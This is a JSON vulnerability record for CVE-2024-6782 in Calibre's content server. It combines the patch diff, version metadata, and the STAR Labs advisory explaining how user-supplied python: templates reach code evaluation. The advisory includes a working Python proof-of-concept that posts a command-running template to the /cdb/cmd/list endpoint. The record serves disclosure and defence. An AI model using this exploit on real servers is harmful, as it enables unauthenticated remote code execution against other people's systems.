{
    "CVE-2024-6782": {
        "published_date": "2024-08-06T03:39:20.856Z",
        "patch_commits": [
            {
                "url": "https://github.com/kovidgoyal/calibre/commit/38a1bf50d8cd22052ae59c513816706c6445d5e9",
                "content": "Fix #2075128 [Private bug](https://bugs.launchpad.net/calibre/+bug/2075128)\n\nFilename: src/calibre/db/cli/cmd_list.py:\n```\n@@ -36,6 +36,12 @@\ndef implementation(\n     db, notify_changes, fields, sort_by, ascending, search_text, limit, template=None\n ):\n     is_remote = notify_changes is not None\n+    if is_remote:\n+        # templates allow arbitrary code execution via python templates. We\n+        # could possibly disallow only python templates but that is more work\n+        # than I feel like doing for this, so simply ignore templates on remote\n+        # connections.\n+        template = None\n     formatter = None\n     with db.safe_read_lock:\n         fm = db.field_metadata\n\n@@ -161,6 +167,8 @@\ndef do_list(\n ):\n     if sort_by is None:\n         ascending = True\n+    if dbctx.is_remote and (template or template_file or template_title):\n+        raise SystemExit(_('The use of templates is disallowed when connecting to remote servers for security reasons'))\n     if 'template' in (f.strip() for f in fields):\n         if template_file:\n             with open(template_file, 'rb') as f:\n\n@@ -331,7 +339,8 @@\ndef option_parser(get_parser, args):\n     parser.add_option(\n         '--template',\n         default=None,\n-        help=_('The template to run if \"{}\" is in the field list. Default: None').format('template')\n+        help=_('The template to run if \"{}\" is in the field list. Note that templates are ignored while connecting to a calibre server.'\n+               ' Default: None').format('template')\n     )\n     parser.add_option(\n         '--template_file',\n```"
            }
        ],
        "sw_version": "v7.14.0",
        "sw_version_wget": "https://github.com/kovidgoyal/calibre/archive/refs/tags/v7.14.0.zip",
        "description": "Improper access control in Calibre 6.9.0 ~ 7.14.0 allow unauthenticated attackers to achieve remote code execution.",
        "sec_adv": [
            {
                "url": "https://starlabs.sg/advisories/24/24-6782/",
                "content": "Home\nAbout\nAdvisories\nBlog\nAchievements\nPublications\nSearch\nHome\n » \nAdvisories\n(CVE-2024-6782) Calibre Remote Code Execution\nJuly 31, 2024\n · 4 min · Amos Ng (@LFlare)\nTable of Contents\nSummary\nProduct Calibre\nVendor Calibre\nSeverity Critical - Unprivileged adversaries may exploit software vulnerabilities to perform remote code execution\nAffected Versions 6.9.0 ~ 7.14.0 (latest version as of writing)\nTested Versions 7.14.0\nCVE Identifier CVE-2024-6782\nCVE Description Improper Access Control in Calibre Content Server allows remote code execution\nCWE Classification(s) CWE-863: Incorrect Authorization\nCAPEC Classification(s) CAPEC-253: Remote Code Inclusion\nCVSS3.1 Scoring System\nBase Score: 9.8 (Critical) Vector String: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\nMetric Value\nAttack Vector (AV) Network\nAttack Complexity (AC) Low\nPrivileges Required (PR) None\nUser Interaction (UI) None\nScope (S) Unchanged\nConfidentiality (C) High\nIntegrity (I) High\nAvailability (A) High\nProduct Overview\nCalibre is a cross-platform free and open-source suite of e-book software. Calibre supports organizing existing e-books into virtual libraries, displaying, editing, creating and converting e-books, as well as syncing e-books with a variety of e-readers. Editing books is supported for EPUB and AZW3 formats. Books in other formats like MOBI must first be converted to those formats, if they are to be edited. Calibre also has a large collection of community contributed plugins.\nCalibre also offers a powerful content server feature. This allows users to share their Calibre libraries over the internet, making it easy to access your e-book collection from anywhere, at any time\nVulnerability Summary\nUnauthenticated remote code execution via Calibre’s content server in Calibre <= 7.14.0.\nVulnerability Details\nThe source of the vulnerability is in cmd_list.py, that is called by the cdb.py router. The router imports a secondary module (in the format cmd_*.py) based on the incoming HTTP request’s path. In this case, a request to /cdb/cmd/list will result in the file cmd_list.py being imported and its implementation() function will be executed. Additionally, the request body’s content is used as *args.\nThe list of cmd_*.py files can be obtained from the src/calibre/db/cli/ directory.\n# src/calibre/srv/cdb.py#L28\n@endpoint('/cdb/cmd/{which}/{version=0}', postprocess=msgpack_or_json, methods=receive_data_methods, cache_control='no-cache')\ndef cdb_run(ctx, rd, which, version):\n    try:\n        m = module_for_cmd(which)\n    except ImportError:\n        raise HTTPNotFound(f'No module named: {which}')\n    if not getattr(m, 'readonly', False): # [1]\n        ctx.check_for_write_access(rd)\n    [...snip...]\n    try:\n        result = m.implementation(db, partial(ctx.notify_changes, db.backend.library_path), *args) # [2]\nThe vulnerable function is located at cmd_list.py::implementation(), so at [1], if the readonly module variable is False or absent, the function check_for_write_access() would not trigger and code execution can continue. The implementation() function of cmd_list.py module is then executed with user-controlled arguments *args at [2].\nIn the cmd_list::implementation() function, it can be seen that user-input is used as a search string to query the library for books. Additionally, a template can also be supplied by the user to be run against the search results.\n# src/calibre/db/cli/cmd_list.py#L15\nreadonly = True\n[...snip...]\ndef implementation(\n    db, notify_changes, fields, sort_by, ascending, search_text, limit, template=None\n):\n    [...snip...]\n    if field == 'template':\n        vals = {}\n        global_vars = {}\n        if formatter is None:\n            from calibre.ebooks.metadata.book.formatter import SafeFormat\n            formatter = SafeFormat()\n        for book_id in book_ids:\n            mi = db.get_proxy_metadata(book_id)\n            vals[book_id] = formatter.safe_format(template, {}, 'TEMPLATE ERROR', mi, global_vars=global_vars)\nThe template is processed with formatter.safe_format(), which evaluates the user-controlled template string without any proper input sanitisation.\n# src/calibre/utils/formatter.py#L1936\ndef safe_format(self, fmt, kwargs, error_value, book,\n    column_name=None, template_cache=None,\n    strip_results=True, template_functions=None,\n    global_vars=None, break_reporter=None,\n    python_context_object=None):\n state = self.save_state()\n [...snip...]\n  try:\n   ans = self.evaluate(fmt, [], kwargs, self.global_vars, break_reporter=break_reporter)\nFinally, the evaluate() function appears to allow for arbitrary execution of any Python code if it is prefixed with python:.\n# src/calibre/utils/formatter.py#L1840\ndef evaluate(self, fmt, args, kwargs, global_vars, break_reporter=None):\n if fmt.startswith('program:'):\n  ans = self._eval_program(kwargs.get('$', None), fmt[8:],\n         self.column_name, global_vars, break_reporter)\n elif fmt.startswith('python:'):\n  ans = self._eval_python_template(fmt[7:], self.column_name)\n else:\n  ans = self.vformat(fmt, args, kwargs)\n  if self.strip_results:\n   ans = self.compress_spaces.sub(' ', ans)\n if self.strip_results:\n  ans = ans.strip(' ')\n return ans\nExploit Conditions\nThis vulnerability can be exploited by an unauthenticated attacker with the default configuration of Calibre’s content server which has basic authentication disabled by default, or by any privileged authenticated attacker.\nProof-of-Concept\nWe have tried our best to make the PoC as portable and cross-platform as possible. This report includes a functional exploit written in Python3 that automatically performs the remote code execution.\nA sample exploit script is shown below:\n#! /usr/bin/env python3\n# PoC for: CVE-2024-6782\n# Description: Unauthenticated remote code execution in calibre <= 7.14.0\n# Written by: Amos Ng (@LFlare)\nimport json\nimport sys\n\nimport requests\n\n_target = \"http://localhost:8080\"\n\ndef exploit(cmd):\n    r = requests.post(\n        f\"{_target}/cdb/cmd/list\",\n        headers={\"Content-Type\": \"application/json\"},\n        json=[\n            [\"template\"],\n            \"\", # sortby: leave empty\n            \"\", # ascending: leave empty\n            \"\", # search_text: leave empty, set to all\n            1, # limit results\n            f\"python:def evaluate(a, b):\\n import subprocess\\n try:\\n return subprocess.check_output(['cmd.exe', '/c', '{cmd}']).decode()\\n except Exception:\\n return subprocess.check_output(['sh', '-c', '{cmd}']).decode()\", # payload\n        ],\n    )\n\n    try:\n        print(list(r.json()[\"result\"][\"data\"][\"template\"].values())[0])\n    except Exception as e:\n        print(r.text)\n\nif __name__ == \"__main__\":\n    exploit(\"whoami\")\nSuggested Mitigations\nEnsure that access controls on publicly accessible endpoints are properly implemented. If code execution is allowed by design, the server should not be exposed publicly, or it should be heavily restricted to highly privileged users only.\nDetection Guidance\nIt is possible to detect potential exploitation of the vulnerability by checking the server’s access logs for repeated POST requests to the /cdb/cmd/list endpoint.\nCredits\nAmos Ng (@LFlare) of STAR Labs SG Pte. Ltd. (@starlabs_sg)\n« PREV\n(CVE-2024-6781) Calibre Arbitrary File Read\nNEXT »\n(CVE-2024-7008) Calibre Reflected Cross-Site Scripting (XSS)\n© 2025 STAR Labs Powered by Hugo & PaperMod",
                "effective": true,
                "effective_reason": "The advisory includes a detailed proof-of-concept (PoC) exploit script to demonstrate the vulnerability."
            }
        ],
        "cwe": [
            {
                "id": "CWE-863",
                "value": "CWE-863 Incorrect Authorization"
            }
        ]
    }
}